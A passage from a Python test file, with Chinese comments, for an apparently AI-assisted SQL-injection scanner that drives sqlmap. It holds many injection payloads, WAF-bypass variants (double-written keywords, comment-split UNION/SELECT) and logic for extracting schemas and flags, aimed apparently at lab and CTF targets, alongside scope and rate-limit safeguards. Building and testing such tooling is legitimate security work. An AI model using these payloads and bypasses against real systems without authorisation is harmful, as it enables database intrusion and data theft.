    got = de._parse_tables(real)
    check("解析带边框的标准表列表（job#59 实测格式）",
          got == ["emails", "referers", "uagents", "users"], f"→ {got}")
    check("解析无边框表列表",
          de._parse_tables("Database: t\n[2 tables]\n| a |\n| b |\n") == ["a", "b"])
    check("解析 [*] 形态表列表",
          de._parse_tables("Database: t\n[2 tables]\n[*] aa\n[*] bb\n") == ["aa", "bb"])
    check("无表名 → 空列表", de._parse_tables("nothing here") == [])


def _probe_paren_tests():
    """研判探针必须含「引号+闭括号」档（Less-12 `WHERE col=("$v")` 语境）。"""
    from app.services import ai as ai_svc

    class _FakeResp:
        def __init__(self, text="<html>ok</html>"):
            self.text = text
            self.status_code = 200
            self.content = text.encode()

    seen = []

    class _FakeClient:
        def __init__(self, *a, **k):
            pass

        def get(self, url, params=None):
            seen.append(params or {})
            return _FakeResp()

        def post(self, url, data=None):
            seen.append(data or {})
            return _FakeResp()

        def close(self):
            pass

    class _EP:
        host = "127.0.0.1:1"
        raw_path = "/x"
        path = "/x"
        method = "GET"
        params = [{"name": "id", "location": "query", "sample_value": "1"}]

    orig = ai_svc.httpx.Client
    ai_svc.httpx.Client = _FakeClient
    try:
        ai_svc._collect_sqli_probes(_EP())
    finally:
        ai_svc.httpx.Client = orig

    vals = [str(v) for d in seen for v in d.values()]
    check("研判探针含单引号+闭括号档 `1')`", "1')" in vals, f"→ {vals[:9]}")
    check('研判探针含双引号+闭括号档 `1")`', '1")' in vals, f'→ {vals[:9]}')


def _derive_ps_tests():
    """从已确认 payload 确定性反推 sqlmap 前后缀（不信 LLM 反推语境）。"""
    from app.services import deep_exploit as de
    for hint, want in (
            ('1")//and//("1"="1', ('1")', '-- -')),        # Less-12 实测形态
            ("1')-- -", ("1')", "-- -")),
            ("1' AND 8392=8392-- -", ("1'", "-- -")),
            ('1" AND 1=1', ('1"', "-- -")),
            ("1 AND 1=1", ("1", "-- -")),                   # 纯数字型
    ):
        got = de._derive_prefix_suffix(hint)
        check(f"反推前后缀 {hint!r}", got == want, f"→ {got}")
    check("空 payload 返回 None", de._derive_prefix_suffix(None) is None)
    check("无特征 payload 返回 None", de._derive_prefix_suffix("abc") is None)


def _dedupe_and_samples_tests():
    # ---- 深挖样例结构化 ----
    from app.services.ai_deep import _parse_samples
    items = _parse_samples("flag::flag{a},notice::hello, world,coupon::x", 5)
    check("样例结构化：key::value 数组",
          items[:3] == [{"flag": "flag{a}"}, {"notice": "hello, world"},
                        {"coupon": "x"}], f"(实际 {items})")
    check("样例结构化：无 key 时按逗号切",
          _parse_samples("aaa,bbb", 5) == [{"value": "aaa"}, {"value": "bbb"}])

    # ---- 查重（内存库）----
    from sqlalchemy import create_engine
    from sqlalchemy.orm import sessionmaker
    from app.models.base import Base
    from app.models.auth import AuthScope
    from app.models.kb import KbPayload
    from app.services import knowledge
    from app.api.task import find_duplicate_scope, normalize_scope_value

    eng = create_engine("sqlite:///:memory:")
    Base.metadata.create_all(eng)
    s = sessionmaker(bind=eng)()
    try:
        p = KbPayload(payload="1' and '1'='1", vector="boolean",
                      target_waf=None, source="manual")
        s.add(p)
        s.commit()
        check("Payload 查重命中（NULL WAF）",
              knowledge.find_duplicate_payload(
                  s, payload="1' and '1'='1", vector="boolean",
                  target_waf=None) is p)
        check("Payload 查重区分 WAF",
              knowledge.find_duplicate_payload(
                  s, payload="1' and '1'='1", vector="boolean",
                  target_waf="X") is None)
        p.deleted_at = "x"
        s.commit()
        check("Payload 查重忽略已删除",
              knowledge.find_duplicate_payload(
                  s, payload="1' and '1'='1", vector="boolean",
                  target_waf=None) is None)

        # 数字字面量不同的同型 payload → 结构签名相同，只保留一条
        a = "id=1001) AND 9885=9885 AND (1311=1311"
        b = "id=1001) AND 2522=2522 AND (3404=3404"
        check("Payload 结构签名：数字归一",
              knowledge.payload_signature(a) == knowledge.payload_signature(b),
              f"({knowledge.payload_signature(a)})")
        rep = KbPayload(payload=a, vector="boolean", target_waf=None,
                        source="auto_feedback")
        s.add(rep)
        s.commit()
        check("Payload 查重：数字不同的同型 payload 命中同一代表",
              knowledge.find_duplicate_payload(
                  s, payload=b, vector="boolean", target_waf=None) is rep)
        check("Payload 查重：不同 vector 不合并",
              knowledge.find_duplicate_payload(
                  s, payload=b, vector="time", target_waf=None) is None)

        sc = AuthScope(name="a", scope_type="domain",
                       scope_value="Example.COM")
        s.add(sc)
        s.commit()
        check("Scope 归一化：去空白/小写",
              normalize_scope_value("  Example.COM ") == "example.com")
        check("Scope 查重命中（大小写/空白）",
              find_duplicate_scope(s, "domain", " example.com ") is sc)
        check("Scope 查重区分类型",
              find_duplicate_scope(s, "wildcard", "example.com") is None)
    finally:
        s.close()

    # ---- 布尔盲注必须走 SafeHttpClient ----
    from app.services.boolean_blind import BooleanBlindExtractor
    try:
        BooleanBlindExtractor(None, "http://127.0.0.1:9/")
        check("布尔盲注禁止裸 httpx（无 client 应报错）", False)
    except ValueError:
        check("布尔盲注禁止裸 httpx（无 client 应报错）", True)


def _param_guess_tests():
    """无表单 GET 参数发现（本地微型站点，离线）。"""
    import threading
    from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
    from urllib.parse import parse_qsl, urlparse

    from sqlalchemy import create_engine
    from sqlalchemy.orm import sessionmaker
    from app.models.base import Base
    from app.models.endpoint import Endpoint
    from app.services.safety import SafeHttpClient
    from app.services import collector

    class Handler(BaseHTTPRequestHandler):
        def log_message(self, *a):
            pass

        def do_GET(self):
            qs = dict(parse_qsl(urlparse(self.path).query))
            body = ("<html><body>" +
                    ("ID PAGE " * 40 if "id" in qs else "BASE " * 10) +
                    "</body></html>").encode("utf-8")
            self.send_response(200)
            self.send_header("Content-Type", "text/html; charset=utf-8")
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)

    srv = ThreadingHTTPServer(("127.0.0.1", 0), Handler)
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    eng = create_engine("sqlite:///:memory:")
    Base.metadata.create_all(eng)
    S = sessionmaker(bind=eng)
    db = S()

    def factory():
        return S()

    client = SafeHttpClient(factory, 1, {"127.0.0.1"},
                            {"rate_limit_qps": 100})
    try:
        url = f"http://127.0.0.1:{srv.server_address[1]}/page"
        base = client.request("GET", url)
        n = collector._guess_query_params(
            db, 1, url, base.status_code, len(base.text or ""),
            client, "medium", {"127.0.0.1"})
        check("无表单页：常见参数名探测命中 id", n >= 1, f"(新增 {n})")
        ep = db.query(Endpoint).filter(Endpoint.task_id == 1).all()
        names = [p.get("name") for e in ep for p in (e.params or [])]
        check("参数发现落库为可探测接口", "id" in names, f"(实际 {names})")
        check("未命中的参数名不误报", "q" not in names, f"(实际 {names})")
    finally:
        client.close()
        db.close()
        srv.shutdown()


def _dbms_sanitize_tests():
    """DBMS 剧本选择与报错页噪声清洗（Less-2 回归）。"""
    from app.services import deep_exploit as de
    from app.services.char_union_exploit import (
        _sanitize_tables, _sanitize_ident, _sanitize_version)

    check("UNION 提取只对 SQLite 启用（未知 DBMS 不再放行）",
          de.union_extract_allowed("SQLite 3.40") is True
          and de.union_extract_allowed("") is False
          and de.union_extract_allowed(None) is False
          and de.union_extract_allowed("MySQL") is False
          and de.union_extract_allowed("PostgreSQL") is False)
    check("表名清洗：报错页英文词被剔除",
          _sanitize_tables("have,error,users,emails,syntax") == "users,emails",
          f"({_sanitize_tables('have,error,users,emails,syntax')})")
    check("库名清洗：have 不是库名",
          _sanitize_ident("have") == "" and _sanitize_ident("security") == "security")
    check("版本号清洗：have 不是版本",
          _sanitize_version("have") == "" and _sanitize_version("5.5.53") == "5.5.53")


def _goal_tests():
    """深入利用目标（schema/flag）必须每次显式选择。"""
    import inspect
    from pydantic import ValidationError
    from app.services import deep_exploit as de
    from app.api.vuln import DeepExploitReq

    check("goal 校验：schema 通过", de.validate_goal("schema") == "schema")
    check("goal 校验：flag 通过", de.validate_goal("flag") == "flag")
    for bad in (None, "", "x"):
        try:
            de.validate_goal(bad)
            check(f"goal 校验：拒绝 {bad!r}", False)
        except ValueError:
            check(f"goal 校验：拒绝 {bad!r}", True)
    check("start_deep_exploit 的 goal 为必填关键字参数",
          inspect.signature(de.start_deep_exploit).parameters["goal"].default
          is inspect.Parameter.empty)
    try:
        DeepExploitReq(mode="ai")
        check("API 模型：缺 goal 被拒", False)
    except ValidationError:
        check("API 模型：缺 goal 被拒", True)
    try:
        DeepExploitReq(mode="ai", goal="x")
        check("API 模型：非法 goal 被拒", False)
    except ValidationError:
        check("API 模型：非法 goal 被拒", True)
    check("API 模型：显式 goal 通过",
          DeepExploitReq(mode="ai", goal="schema").goal == "schema")

    # ---- goal=schema 最小化：实战只要一个库名 ----
    check("schema 最小化：已有库名 → 立即停",
          de._minimal_action("schema", {"dbs": ["security"]}, "tables")[0] == "stop")
    check("schema 最小化：仅尝试过 current_db（无库名）→ 继续",
          de._minimal_action("schema", {"did_current_db": True}, "dbs")[0] == "dbs")
    check("schema 最小化：尚无库名 → 继续取库名",
          de._minimal_action("schema", {}, "dbs")[0] == "dbs")
    check("schema 最小化：flag 目标不受限",
          de._minimal_action("flag", {"dbs": ["security"]}, "tables")[0] == "tables")
    check("schema 提示词约束：只要一个库名、不 dump",
          "只要一个库名" in de._DEEP_SYSTEM and "不 dump" in de._DEEP_SYSTEM)

    # ---- 不随意上 --tamper：仅 WAF 绕过形态才启用 ----
    check("tamper：普通 payload 不加",
          de.pick_tamper_args("1' OR 1=1--") == [])
    check("tamper：49920 型才加 space2comment+doublekeywords",
          de.pick_tamper_args("1'/**/AND/**/1=1")
          == ["--tamper", "space2comment,doublekeywords"])
    check("tamper：// 型才加 space2slash",
          de.pick_tamper_args("1'//AND//1=1") == ["--tamper", "space2slash"])

    # 语境反推：剥离 sqlmap 证据行里的 `参数名=`，否则 --prefix 会多带参数名
    check("前后缀反推：剥离 uname= 前缀（Less-16 实测）",
          de._derive_prefix_suffix('uname=1") AND (SELECT 1) AND ("a"="a')
          == ('1")', '-- -'))
    check("前后缀反推：普通单引号不受影响",
          de._derive_prefix_suffix("id=1' AND 1=1-- -") == ("1'", "-- -"))

    # ---- 各深入利用剧本支持 db_only（不枚举表/不取数）----
    from app.services.char_union_exploit import run_char_union
    from app.services.pg_union_exploit import run_pg_union
    check("char_union 支持 db_only",
          "db_only" in inspect.signature(run_char_union).parameters)
    check("pg_union 支持 db_only",
          "db_only" in inspect.signature(run_pg_union).parameters)


def _deep_exploit_p0_tests():
    """2026-10-22 深入利用 P0：库名解析 / HTTPS scheme / PG-UNION 兄弟参数。"""
    import inspect
    from app.services import deep_exploit as de

    pg_line = "current database (equivalent to schema on PostgreSQL): 'public'"
    check("_parse_dbs 识别 PostgreSQL schema 行",
          de._parse_dbs(pg_line) == ["public"], f"(实际 {de._parse_dbs(pg_line)})")
    check("_parse_dbs 识别 MySQL current database",
          de._parse_dbs("current database: 'security'") == ["security"])
    dbs_block = ("available databases [3]:\n[*] information_schema\n"
                 "[*] postgres\n[*] app\n")
    check("_parse_dbs 解析 available databases 块（旧实现恒空）",
          de._parse_dbs(dbs_block) == ["postgres", "app"],
          f"(实际 {de._parse_dbs(dbs_block)})")
    check("scheme 推导：https 目标",
          de.scheme_for_target("https://x.example.com:8443/") == "https")
    check("scheme 推导：无协议时默认 http",
          de.scheme_for_target("x.example.com:8080") == "http")
    run_src = inspect.getsource(de._run)
    check("_run 不再硬编码 http 深挖 URL",
          'f"http://{ep.host}' not in run_src)
    check("_run 定义了 siblings 映射（PG-UNION 不再 NameError）",
          "siblings =" in run_src and "sibling_empty=siblings" in run_src)

    # 2026-10-22 hbc2-17133 实测：run_pg_union 的 finally 调 close()，
    # 但 PgUnionExploiter 从未实现 → 每次 PG-UNION 深挖都 AttributeError 丢结果。
    from app.services.pg_union_exploit import PgUnionExploiter, run_pg_union
    check("PgUnionExploiter 实现了 close()",
          callable(getattr(PgUnionExploiter, "close", None)))
    check("run_pg_union 支持 POST（method/body_template）",
          {"method", "body_template"} <= set(inspect.signature(run_pg_union).parameters))

    # POST 靶点：PG-UNION / 字符 UNION 必须把参数放进 body，否则服务端不执行注入。
    from app.services.char_union_exploit import run_char_union
    check("run_char_union 支持 POST（method/body_template）",
          {"method", "body_template"} <= set(inspect.signature(run_char_union).parameters))
    check("_run 给 PG-UNION 传接口方法与 body",
          "method=ep.method, body_template=_fill(b_params)" in run_src)
    check("_run 给字符 UNION 传接口方法与 body",
          run_src.count("method=ep.method, body_template=_fill(b_params)") >= 2)

    # 2026-10-22 hbc2-17133 误报：应用层错误信封被当成回显证据（db=msg/tables=msg）
    from app.services import pg_union_exploit as pgu
    check("错误信封 JSON 被识别（status=error/msg）",
          pgu._looks_error('{"msg":"查询服务暂不可用","status":"error"}') is True)
    check("正常 JSON 结果不算错误",
          pgu._looks_error('{"data":[[1,"ok"]],"status":"success"}') is False)
    _ex = pgu.PgUnionExploiter(url="http://127.0.0.1:1/x", param="q")
    _ex.baseline = '{"data":[[1,"old"]],"status":"success"}'
    check("_new_token 不从错误信封取 msg",
          _ex._new_token('{"msg":"查询服务暂不可用","status":"error"}') == "")
    check("_new_token 从 data 取值",
          _ex._new_token('{"data":[["mhszed0","v",3,4]],"status":"success"}') == "mhszed0")
    _ex.close()

    # UNION 回显型 DBMS 指纹（不依赖时间；时间盲注在限流靶机上假阳性）
    from app.services.dbms_probe import fingerprint_dbms_union, split_union_payload
    _sp = split_union_payload("1' UNION SELECT 'mhszed0','mhszed1','mhszed2','mhszed3'-- -")
    check("split_union_payload 拆出 4 列",
          _sp is not None and len(_sp[1]) == 4, f"(实际 {_sp})")
    check("存在 UNION 回显 DBMS 指纹", callable(fingerprint_dbms_union))
    check("时间指纹有负向对照（server_slow）",
          "server_slow" in inspect.getsource(__import__(
              "app.services.dbms_probe", fromlist=["x"]).fingerprint_dbms))

    # SQLite 列名解析：hbc2-17133 的 flag 在 system_config(config_key,config_value)
    from app.services.ai_deep import parse_sqlite_columns
    _schema = (
        "CREATE TABLE system_config (\n"
        "        config_key TEXT NOT NULL,\n"
        "        config_value TEXT NOT NULL,\n"
        "        update_time TEXT NOT NULL\n"
        "    );\n"
        "CREATE TABLE archives (id INTEGER PRIMARY KEY, title TEXT)")
    _cols = parse_sqlite_columns(_schema)
    check("sqlite_master 解析列名（system_config）",
          _cols.get("system_config") == ["config_key", "config_value", "update_time"],
          f"(实际 {_cols})")
    check("sqlite_master 解析列名（archives）",
          _cols.get("archives") == ["id", "title"], f"(实际 {_cols})")
    # 回显是 JSON 时换行是字面量 \n（hbc2-45907 实测），也必须能解析
    _json_schema = ('{"data":[[1,"CREATE TABLE system_config (\\n'
                    ' config_key TEXT NOT NULL,\\n config_value TEXT NOT NULL\\n'
                    ' ),CREATE TABLE archives (\\n id INTEGER,\\n title TEXT\\n'
                    ' )",3,4]],"status":"success"}')
    _jc = parse_sqlite_columns(_json_schema)
    check("JSON 转义的 sqlite_master 也能解析列名",
          _jc.get("system_config") == ["config_key", "config_value"]
          and _jc.get("archives") == ["id", "title"], f"(实际 {_jc})")
    check("goal=flag 拿到 flag 后立即收口",
          "flag_found" in run_src and "state.get(\"flag_sample\")" in run_src)


def _target_safety_tests():
    """2026-10-22 实战安全：目标不可达早停 + 总预算 + 假成功判据。"""
    import inspect
    import os
    import shutil
    import tempfile
    import time as _time
    from app.core import config
    from app.services import deep_exploit as de, scheduler, pipeline
    from sqlmap_adapter import runner

    check("利用成功判据不把 session 恢复行当战果",
          runner._exploit_produced(
              "resumed: public\n"
              "current database (equivalent to schema on PostgreSQL): 'public'\n"
              "[CRITICAL] connection timed out to the target URL") is False)
    check("利用成功判据认表列表/retrieved",
          runner._exploit_produced("[2 tables]\n| users |") is True
          and runner._exploit_produced("[INFO] retrieved: security") is True)

    # 用假 sqlmap 进程验证真实早停：连续输出 4 次连接失败 → reader 杀进程、返回 unreachable
    fake = tempfile.NamedTemporaryFile("w", suffix=".py", delete=False, encoding="utf-8")
    fake.write(
        "import time\n"
        "for _ in range(50):\n"
        "    print('[CRITICAL] connection timed out to the target URL. "
        "sqlmap is going to retry the request(s)', flush=True)\n"
        "    time.sleep(0.05)\n")
    fake.close()
    orig_find = runner.find_sqlmap
    runner.find_sqlmap = lambda: fake.name
    try:
        t0 = _time.monotonic()
        res = runner.run_sqlmap(job_id=987654, url="http://127.0.0.1:1/x?q=1",
                                timeout_s=10)
        dt = _time.monotonic() - t0
        check("连续连接失败 → 主动终止（unreachable）",
              res.get("result_class") == "unreachable",
              f"(实际 {res.get('result_class')})")
        check("不可达早停远快于超时预算", dt < 5, f"(耗时 {dt:.1f}s)")
    finally:
        runner.find_sqlmap = orig_find
        try:
            os.unlink(fake.name)
        except OSError:
            pass
        shutil.rmtree(os.path.join(config.DATA_DIR, "sqlmap", "job_987654"),
                      ignore_errors=True)

    run_src = inspect.getsource(de._run)
    check("深挖循环处理 unreachable 并停止", "unreachable" in run_src)
    check("深挖有总预算硬上限",
          "deep_total_budget_s" in run_src
          and config.DEFAULT_SCAN_CONFIG.get("deep_total_budget_s", 0) > 0)
    sched_src = inspect.getsource(scheduler.run_scan)
    check("扫描调度遇到 unreachable 停止整条流水线",
          'stats["unreachable"] = True' in sched_src)
    check("流水线把 unreachable 落为 terminated",
          'stats.get("unreachable")' in inspect.getsource(pipeline.run_task))
    from app.api import scan as scan_api
    check("复核后 resume 同样把 unreachable 落为 terminated",
          'stats.get("unreachable")' in inspect.getsource(scan_api.resume_scan))
    from app.services import collector, normalizer
    check("POST 表单不再抑制 GET 参数猜测（Less-59 回归）",
          'if method == "GET" and body_params' in
          inspect.getsource(collector._parse_html))

    # JS 里的 fetch POST 搜索框：必须解析出 method 与 body 参数
    calls = []
    orig_upsert = normalizer.upsert_endpoint
    normalizer.upsert_endpoint = lambda db, **kw: calls.append(kw)
    try:
        js = ("fetch('/search', {method:'POST', "
              "headers:{'Content-Type':'application/x-www-form-urlencoded'}, "
              "body:`keyword=${encodeURIComponent(keyword)}`})")
        collector._parse_js(None, 1, 'http://x.example.com/static/js/main.js',
                            js, {'x.example.com'}, 'http://x.example.com/')
    finally:
        normalizer.upsert_endpoint = orig_upsert
    check("JS fetch POST 被登记为 POST 接口",
          any(c.get("method") == "POST" and str(c.get("url", "")).endswith("/search")
              for c in calls), f"(实际 {calls})")
    check("JS fetch body 参数被登记（keyword）",
          any(p.get("name") == "keyword"
              for c in calls for p in (c.get("body_params") or [])))


def _impact_report_tests():
    """2026-10-22 影响证明：报告必须能给出库/表/样本与获取过程。"""
    import inspect
    from types import SimpleNamespace
    from app.core import config
    from app.services import report, scheduler
    from app.services import deep_exploit as de

    evs = [
        SimpleNamespace(evidence_type="deep_exploit",
                        content="AI 深挖直发：0 命中 / 5 请求",
                        meta={"stage": "ai_deep"}),
        SimpleNamespace(evidence_type="deep_exploit",
                        content="【影响证明·current_db】DBMS=PostgreSQL；"
                                "库/schema=['public']；表=[]",
                        meta={"stage": "impact_current_db", "dbms": "PostgreSQL",
                              "dbs": ["public"], "tables": []}),
        SimpleNamespace(evidence_type="console_log",
                        content="[INFO] GET parameter 'q' appears to be "
                                "'AND boolean-based blind' injectable\n"
                                "back-end DBMS: PostgreSQL\n"
                                "    Payload: category=&q=1%' AND 8214=8214",
                        meta={}),
    ]
    check("报告影响证据排序：impact 条优先于 AI 0 命中",
          report._deep_score(evs[1]) > report._deep_score(evs[0]))
    db, tables, sample = report._deep_facts(evs)
    check("报告汇总库/schema", db == "public", f"(实际 {db!r})")
    payloads = report._payload_texts(evs)
    check("Payload 证据缺失时从 sqlmap 输出兜底",
          bool(payloads) and "8214=8214" in payloads[0], f"(实际 {payloads})")
    keys = " ".join(report._key_evidence(evs))
    check("报告提取关键判定行",
          "injectable" in keys and "PostgreSQL" in keys)
    src = inspect.getsource(report._vuln_lines)
    check("报告含“影响证明”段", "影响证明" in src)
    check("报告含“获取过程”段", "获取过程" in src)
    evs3 = [
        SimpleNamespace(evidence_type="deep_exploit", content="旧 UNION 提取", meta={
            "stage": "union_extract", "tables": ["no", "warning", "mysql_fetch_array"]}),
        SimpleNamespace(evidence_type="deep_exploit", content="影响证明", meta={
            "stage": "impact_current_db", "schema": "security",
            "dbs": ["security"], "tables": []}),
    ]
    db3, tables3, _ = report._deep_facts(evs3)
    check("报告忽略 union_extract 伪表名", tables3 == [], f"(实际 {tables3})")
    check("报告保留可信 schema", db3 == "security", f"(实际 {db3!r})")
    pay = report._payload_texts([
        SimpleNamespace(evidence_type="payload", content="[boolean] 1'\n预期判据: x"),
        SimpleNamespace(evidence_type="payload",
                        content="[boolean] 1'/**/uunionnion/**/sselectelect/**/1,2,3--/**/"),
    ])
    check("报告优先展示 WAF 绕过 Payload", "uunionnion" in pay[0], f"(实际 {pay})")
    evs4 = [
        SimpleNamespace(evidence_type="deep_exploit", seq=1, content="旧",
                        meta={"stage": "impact_current_db", "dbs": ["challdnges"]}),
        SimpleNamespace(evidence_type="deep_exploit", seq=2, content="新",
                        meta={"stage": "impact_current_db", "dbs": ["challenges"],
                              "extract_query": "SELECT DATABASE()"}),
    ]
    db4, tables4, _ = report._deep_facts(evs4)
    check("同分取最新 impact 证据（challdnges→challenges）",
          db4 == "challenges", f"(实际 {db4!r})")
    check("报告展示提取语句",
          report._deep_extract(evs4) == "SELECT DATABASE()")
    evs_old = [SimpleNamespace(
        evidence_type="deep_exploit", seq=1, content="",
        meta={"stage": "impact_current_db", "dbms": "MySQL", "dbs": ["challenges"]})]
    check("旧证据无 extract_query 也能反推提取语句",
          report._deep_extract(evs_old) == "SELECT DATABASE()")
    evs5 = [SimpleNamespace(
        evidence_type="deep_exploit", seq=1, content="",
        meta={"stage": "current_db",
              "extra": ["--dbms", "MySQL", "--current-db", "--fresh-queries"]})]
    check("sqlmap 提取优先展示 sqlmap 语句",
          report._deep_extract(evs5).startswith("sqlmap --dbms MySQL"))
    check("报告整份丢弃 PHP 报错表名",
          report._clean_tables(["no", "mysql_fetch_array", "comments"]) == [])
    evs_stop = [SimpleNamespace(
        evidence_type="deep_exploit", seq=9, content="",
        meta={"stage": "stop", "dbs": ["security"],
              "tables": ["no", "warning", "mysql_fetch_array"]})]
    _, t_stop, _ = report._deep_facts(evs_stop)
    check("stop 阶段不再带出伪表名", t_stop == [], f"(实际 {t_stop})")
    from app.services import deep_exploit as _de
    check("深挖结果同样整份丢弃报错表名",
          _de._clean_tables(["no", "mysql_fetch_array"]) == [])
    sched_src = inspect.getsource(scheduler.run_scan)
    check("超时升级漏洞从 findings 补确认 Payload",
          'extra.get("findings")' in sched_src and "parameters" in sched_src)
    check("深挖落结构化影响证明证据",
          "影响证明" in inspect.getsource(de._run))
    check("从 sqlmap 输出提取确认 Payload",
          de._payload_from_output(
              "    Parameter: q (GET)\n"
              "        Payload: category=&q=1%' AND 4500=4500 AND 'lGum%'='lGum")
          == "category=&q=1%' AND 4500=4500 AND 'lGum%'='lGum")
    check("深挖会话恢复时补 payload 证据",
          "_payload_from_output" in inspect.getsource(de._run))
    check("初筛输出也兜底提取 Payload",
          "runner._extract_payload" in inspect.getsource(scheduler.run_scan))
    check("前后缀反推按当前参数取值（不吞兄弟参数）",
          de._derive_prefix_suffix(
              "category=&q=1%' AND 4500=4500 AND 'lGum%'='lGum", "1", "q")
          == ("1%'", "-- -"))
    run_src = inspect.getsource(de._run)
    check("PostgreSQL tables 用 schema 而不是 database",
          "PostgreSQL 的 `-D` 要 schema" in run_src)
    check("AI 提示词区分 PG database 与 schema",
          "db 字段填 **schema**" in de._DEEP_SYSTEM)
    check("解析 PG 真实库名（sql-query 单行）",
          de._parse_db_name("SELECT current_database(): 'appdb'") == "appdb")
    check("解析 PG 真实库名（表格形态）",
          de._parse_db_name(
              "SELECT current_database()\n+-------+\n| appdb |\n+-------+") == "appdb")
    check("PG goal=flag 会补取 current_database()",
          "current_database()" in inspect.getsource(de._run))
    check("轻量盲注提取默认关闭（防 lihrary/challdnges 误读）",
          config.DEFAULT_SCAN_CONFIG.get("deep_use_blind_extract") is False
          and "deep_use_blind_extract" in inspect.getsource(de._run))
    run_src = inspect.getsource(de._run)
    check("current_db 强制 --fresh-queries（不复用错误缓存）",
          '"--current-db", "--fresh-queries"' in run_src)
    check("goal=schema 跳过 AI 盲注兜底",
          'goal != "schema"' in run_src and "skip_ai_blind_schema" in run_src)
    check("goal=schema 不采信 UNION 剧本解析的库/表",
          'goal != "schema"' in run_src and
          "UNION 剧本在" in run_src)
    evs2 = list(evs) + [SimpleNamespace(
        evidence_type="deep_exploit",
        content="【影响证明·db_name】真实数据库名: appdb（schema=public）",
        meta={"stage": "impact_db_name", "db_name": "appdb", "schema": "public"})]
    db2, _, _ = report._deep_facts(evs2)
    check("报告同时展示真实库名与 schema",
          db2 == "appdb (schema=public)", f"(实际 {db2!r})")


def _orand_tests():
    """OR/AND 只删一次的黑名单：双写保留空格 + tamper 选择（19330）。"""
    import inspect
    from app.services import ai, deep_exploit as de
    check("double_write('and') 被删一次后还原",
          ai.double_write("and").replace("and", "", 1) == "and",
          f"(实际 {ai.double_write('and')})")
    check("double_write('or') 被删一次后还原",
          ai.double_write("or").replace("or", "", 1) == "or")
    _v = ai.bypass_variants("1' and 1=1--")
    check("AND payload 前 8 个含保留空格双写",
          any("aandnd" in x.lower() and "//" not in x for x in _v[:8]),
          f"(实际 {_v[:4]})")
    _v2 = ai.bypass_variants("1' or 1=1--")
    check("OR payload 前 8 个含保留空格双写",
          any("oorr" in x.lower() and "//" not in x for x in _v2[:8]),
          f"(实际 {_v2[:4]})")
    check("OORR 形态触发 orand tamper",
          de.pick_tamper_args("1' OORR 1=1--") == ["--tamper", "orand"])
    check("研判探针含 orand 成对档",
          "orand_true" in inspect.getsource(ai._collect_sqli_probes))
    from app.services.ai_deep import _builtin_for
    check("通用内置 payload 不混入 OORR（已降级为应用层过滤技术）",
          not any("OORR" in x["payload"] for x in _builtin_for("MySQL")))


def _kb_bypass_tests():
    """成功 payload 的绕过标签与知识库回流。"""
    import inspect
    from app.services import knowledge, evidence

    check("标签：注释内联",
          "inline_comment" in knowledge.infer_bypass_tags("1'/**/OORR/**/1=1"))
    check("标签：双写",
          "double_write" in knowledge.infer_bypass_tags("1' OORR 1=1-- -"))
    check("标签：运算符替换",
          "operator_replace" in knowledge.infer_bypass_tags("1' && 1=1-- -"))
    check("标签：版本注释",
          "version_comment" in knowledge.infer_bypass_tags("1' /*!50000AND*/ 1=1"))
    check("标签：十六进制",
          "hex_encoding" in knowledge.infer_bypass_tags("1' AND 0x61646d696e"))
    check("普通 payload 无绕过标签",
          knowledge.infer_bypass_tags("1' AND 1=1-- -") == [])
    check("确认回流时写入绕过标签",
          "infer_bypass_tags" in inspect.getsource(evidence.confirm_vulnerability))
    check("知识库检索包含通用验证 payload",
          "target_waf.is_(None)" in inspect.getsource(knowledge.find_payloads))


def _grammar_profile_tests():
    """等价类引擎 + 应用层过滤画像（纯函数部分）。"""
    import inspect
    from app.services import payload_grammar as pg, filter_profile as fp, ai, prober

    _m = pg.bypass_matrix("1' AND 1=1-- -")
    check("等价类：包含运算符替代 &&",
          any("&&" in v for v in _m), f"(实际 {_m[:5]})")
    check("等价类：包含关键字注释切分 A/**/ND",
          any("A/**/ND" in v for v in _m), f"(实际 {_m[:6]})")
    check("等价类：包含版本注释 /*!50000AND*/",
          any("/*!50000AND*/" in v for v in _m), f"(实际 {_m[:8]})")
    _lim = pg.bypass_matrix("1' OR 1=1-- -", limit=4)
    check("等价类：limit 生效且去重",
          len(_lim) <= 4 and len(set(_lim)) == len(_lim)
          and "1' OR 1=1-- -" not in _lim, f"(实际 {_lim})")

    check("画像：探针预算生效", len(fp.probe_matrix("1", budget=5)) == 5)
    check("画像分类：无差异=same",
          fp.classify(200, 100, 200, 100, "") == "same")
    check("画像分类：长度差=diff",
          fp.classify(200, 300, 200, 100, "") == "diff")
    check("画像分类：拦截=blocked",
          fp.classify(403, 100, 200, 100, "") == "blocked")
    check("画像分类：SQL 报错=error",
          fp.classify(200, 100, 200, 100,
                      "You have an error in your SQL syntax") == "error")
    check("画像分类：基线已有报错字样不算命中",
          fp.classify(200, 100, 200, 100,
                      "You have an error in your SQL syntax",
                      baseline_text="You have an error in your SQL syntax") == "same")
    _rows = [{"label": "and_double", "state": "diff"},
             {"label": "or_op", "state": "blocked"},
             {"label": "and_plain", "state": "same"}]
    check("画像汇总：只收 diff/error 形态",
          fp.summarize(_rows)["forms"] == ["and_double"]
          and fp.summarize(_rows)["blocked"] == ["or_op"])
    check("研判探针失败路径接入过滤画像",
          "profile_filters" in inspect.getsource(prober.probe_endpoint))
    _v = ai.bypass_variants("1' AND 1=1-- -")
    check("bypass_variants 前 6 个含运算符/注释等价形态",
          any(("&&" in x) or ("A/**/ND" in x) for x in _v[:6]),
          f"(实际 {_v[:6]})")


def _waf_report_tests():
    """报告 WAF 画像段：有 WAF 才输出，没有整段不出现（用户要求）。"""
    from app.services import report

    class _Row:
        def __init__(self, has_waf):
            self.has_waf = has_waf
            self.product = "safedog"
            self.product_confidence = 0.9
            self.block_behavior = "403 拦截页"
            self.bypass_suggestions = ["encoding", "case_mix"]
            self.probe_history = {"probes": 6}

    class _Q:
        def __init__(self, row): self.row = row
        def filter(self, *a): return self
        def first(self): return self.row

    class _DB:
        def __init__(self, row): self.row = row
        def query(self, *a): return _Q(self.row)

    check("无 WAF → 报告不出现画像段",
          report._waf_lines(_DB(_Row(False)), 1) == [])
    _lines = report._waf_lines(_DB(_Row(True)), 1)
    check("有 WAF → 报告输出产品/置信/建议",
          any("WAF 画像" in x for x in _lines)
          and any("safedog" in x for x in _lines)
          and any("encoding" in str(x) for x in _lines),
          f"(实际 {_lines})")


def _target_normalize_tests():
    """目标 URL 首尾空白：urlparse 容忍、httpx 不容忍（任务 #26 实测）。"""
    import inspect
